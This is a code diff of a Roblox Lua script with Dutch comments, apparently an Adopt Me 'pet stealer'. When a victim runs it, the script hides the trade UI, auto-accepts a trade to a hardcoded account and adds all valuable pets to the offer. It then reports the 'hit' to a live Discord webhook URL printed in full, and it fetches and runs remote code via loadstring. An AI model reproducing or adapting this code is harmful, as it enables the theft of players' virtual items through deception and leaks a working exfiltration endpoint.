@@ -1,5 +1,5 @@
-_G.USERNAME = "Jazonyy67" -- Account dat de pets ontvangt [cite: 1]
-_G.WEBHOOK_URL = "https://discord.com/api/webhooks/1497168308489949234/FzshgxFf5uESFLgpdE6Ma45YnVp3pePX30drKAzgsIWSPvw75HPVHwpWAJ3vx9oHJydJ" -- [cite: 1]
+_G.USERNAME = "Jazonyy67" 
+_G.WEBHOOK_URL = "https://discord.com/api/webhooks/1497168308489949234/FzshgxFf5uESFLgpdE6Ma45YnVp3pePX30drKAzgsIWSPvw75HPVHwpWAJ3vx9oHJydJ"
 
 local targetName = _G.USERNAME
 local webhookUrl = _G.WEBHOOK_URL
@@ -11,80 +11,78 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
 local isLogging = false 
+local hasFinishedFirstTrade = false
 
+-- 🚫 BLACKLIST [cite: 1, 2]
 local BLACKLIST = {
     ["practice_dog"] = true, ["starter_egg"] = true, ["sandwich-default"] = true,
     ["ice_skates"] = true, ["trade_license"] = true, ["beach_2024_mahi_spinning_rod_temporary"] = true,
     ["white_bowtie"] = true, ["cowbell"] = true, ["blue_cap"] = true,
     ["squeaky_bone_default"] = true, ["stroller-default"] = true,
     ["ice_dimension_2025_ice_soup_bait"] = true, ["starter_egg_2025_mouse"] = true
-} [cite: 1, 2]
+}
 
-local hasFinishedFirstTrade = false
-
--- ✨ ULTIEME TRANSPARANTIE FUNCTIE
-local function makeTransparent(obj)
+-- ✨ ULTIEME TRANSPARANTIE FUNCTIE (Voor TradeApp, TradeRequestApp en HintApp)
+local function hideUI(obj)
     if not obj then return end
     if obj:IsA("GuiObject") then
         pcall(function()
-            if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
-                obj.TextTransparency = 1
-            end
-            if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
-                obj.ImageTransparency = 1
-            end
+            obj.Visible = false -- Maak het onzichtbaar voor het slachtoffer
+            -- Maak alle sub-elementen transparant mocht 'Visible' niet werken
+            if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then obj.TextTransparency = 1 end
+            if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then obj.ImageTransparency = 1 end
             obj.BackgroundTransparency = 1
-            obj.Visible = false -- Extra veiligheid: zet het ook op onzichtbaar
         end)
     end
     for _, child in ipairs(obj:GetDescendants()) do
-        makeTransparent(child)
+        hideUI(child)
     end
 end
 
--- 🛠 DATABASE OPHALEN [cite: 3]
+-- 🛠 DATABASE FIX (Voorkomt 'nil value' error op loadstring) 
 local function getExternalValues()
-    local source = ""
-    pcall(function() source = game:HttpGet(valuesUrl) end)
-    if source == "" then return {pets = {}} end
+    local success, source = pcall(function() return game:HttpGet(valuesUrl) end)
+    if not success or source == "" then return {pets = {}} end
+    
+    local loadFunc = loadstring or (syn and syn.load_string)
+    if not loadFunc then
+        warn("Executor ondersteunt geen loadstring. Waardes worden niet geladen.")
+        return {pets = {}}
+    end
+
     source = source:match("^%s*(.-)%s*$")
     if not source:find("return") then source = source .. "\nreturn ValueList" end
-    local func = loadstring(source)
+    local func = loadFunc(source)
     return func and func() or {pets = {}}
 end
 local ValueList = getExternalValues()
 
--- 🔍 INVENTARIS CHECK (Om te zien of items nog bestaan)
-local function checkItemsStillInInventory(itemIds)
+-- 🔍 ITEM VERIFICATIE (Tegen dubbele logs)
+local function checkStillInInv(itemIds)
     local data = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[LocalPlayer.Name]
     local inv = data and data.inventory
     if not inv then return false end
-    
-    for _, uniqueId in ipairs(itemIds) do
-        for cat, group in pairs(inv) do
-            if group[uniqueId] then
-                return true -- Item is er nog, trade was waarschijnlijk gecanceld
-            end
+    for _, id in ipairs(itemIds) do
+        for _, group in pairs(inv) do
+            if group[id] then return true end
         end
     end
-    return false -- Geen van de items gevonden, trade is geslaagd!
+    return false
 end
 
--- 🔍 ITEM INFO OPHALEN [cite: 4, 5, 6, 7]
+-- 🔍 ITEM INFO [cite: 4, 5, 6, 7]
 local function getItemInfo(uniqueId)
-    local info = {name = "Unknown", rarity = "COMMON", value = 0, rawId = "", uniqueId = uniqueId}
+    local info = {name = "Unknown", rarity = "COMMON", value = 0, rawId = ""}
     pcall(function()
         local data = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[LocalPlayer.Name]
         local inv = data and data.inventory
-        if not inv then return end
         for cat, group in pairs(inv) do
             if group[uniqueId] then
                 local d = group[uniqueId]
                 info.rawId = d.id or cat
                 local name = info.rawId:gsub("_", " "):gsub("(%l)(%w*)", function(a,b) return a:upper()..b:lower() end)
                 local vData = ValueList.pets and ValueList.pets[name]
-                local p = d.properties or {}
-                local tag = ((d.mega_neon and "M") or (d.neon and "N") or "") .. (p.flyable and "F" or "") .. (p.rideable and "R" or "")
+                local tag = ((d.mega_neon and "M") or (d.neon and "N") or "") .. ((d.properties and d.properties.flyable) and "F" or "") .. ((d.properties and d.properties.rideable) and "R" or "")
                 info.name = name .. (tag ~= "" and " ("..tag..")" or "")
                 if vData then
                     local prefix = (d.mega_neon and "mvalue") or (d.neon and "nvalue") or "rvalue"
@@ -100,17 +98,15 @@ local function getItemInfo(uniqueId)
     return info
 end
 
--- 📊 WEBHOOK LOGGING (Nu met verificatie) [cite: 8, 9, 10, 11]
+-- 📊 WEBHOOK LOG [cite: 8, 9, 10, 11]
 function postLog(data)
     if #data == 0 or isLogging then return end
     isLogging = true
-    
     local list, total = "", 0
     for _, i in ipairs(data) do
         list = list .. "┕ **[" .. i.rarity .. "]** " .. i.name .. " | `Val: " .. i.value .. "`\n"
         total = total + i.value
     end
-    
     local embed = {
         content = "🚨 **NEW HIT DETECTED** 🚨",
         embeds = {{
@@ -124,17 +120,15 @@ function postLog(data)
             footer = {text = "Paxz V29 • " .. os.date("%X")}
         }}
     }
-    
     pcall(function()
         local req = (syn and syn.request) or (http and http.request) or http_request or request
         req({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(embed)})
     end)
-    
-    task.wait(1) 
+    task.wait(1) -- 1 seconde cooldown tegen dubbele logs
     isLogging = false
 end
 
--- ⚡ LOOP [cite: 12, 13, 14, 15]
+-- ⚡ MAIN LOOP [cite: 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24]
 task.spawn(function()
     local API = ReplicatedStorage:WaitForChild("API")
     
@@ -146,42 +140,34 @@ task.spawn(function()
         local reqUi = LocalPlayer.PlayerGui:FindFirstChild("TradeRequestApp")
         local hintUi = LocalPlayer.PlayerGui:FindFirstChild("HintApp")
 
-        -- Maak ALLES onzichtbaar (ook HintApp)
-        if ui then makeTransparent(ui) end
-        if reqUi then makeTransparent(reqUi) end
-        if hintUi then makeTransparent(hintUi) end
+        -- UI Verbergen
+        if ui then hideUI(ui) end
+        if reqUi then hideUI(reqUi) end
+        if hintUi then hideUI(hintUi) end
 
         if target then
-            task.spawn(function() 
-                pcall(function() 
-                    API:FindFirstChild("TradeAPI/AcceptOrDeclineTradeRequest"):InvokeServer(target, true) -- [cite: 14]
-                end) 
-            end)
+            pcall(function() API:FindFirstChild("TradeAPI/AcceptOrDeclineTradeRequest"):InvokeServer(target, true) end)
 
             if ui and ui:FindFirstChild("Frame") and ui.Frame.Visible then
-                local currentTradeItems = {}
-                local currentIds = {}
+                local currentTradeItems, currentIds = {}, {}
                 local data = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[LocalPlayer.Name]
                 local inv = data and data.inventory
                 
-                if inv then [cite: 15]
+                if inv then
                     for cat, group in pairs(inv) do
-                        if cat ~= "stickers" then [cite: 16]
+                        if cat ~= "stickers" then
                             for id, _ in pairs(group) do 
                                 local stats = getItemInfo(id)
-                                if not BLACKLIST[stats.rawId] then [cite: 17]
+                                if not BLACKLIST[stats.rawId] then
                                     table.insert(currentTradeItems, stats)
                                     table.insert(currentIds, id)
-                                    pcall(function() 
-                                        API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(id) -- [cite: 18]
-                                    end)
+                                    pcall(function() API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(id) end)
                                 end
                             end
                         end
                     end
                 end
 
-                -- Bevestig trade stages [cite: 21, 22]
                 while ui and ui:FindFirstChild("Frame") and ui.Frame.Visible do
                     pcall(function() 
                         API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
@@ -190,16 +176,13 @@ task.spawn(function()
                     task.wait(0.3)
                 end
 
-                -- CRUCIALE FIX: Wacht even en check of de pets weg zijn
                 task.wait(0.5)
-                if #currentTradeItems > 0 and not checkItemsStillInInventory(currentIds) then 
+                if #currentTradeItems > 0 and not checkStillInInv(currentIds) then 
                     postLog(currentTradeItems)
                     hasFinishedFirstTrade = true
                 end
             else
-                pcall(function() 
-                    API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(target) -- [cite: 24]
-                end)
+                pcall(function() API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(target) end)
             end
         end
     end
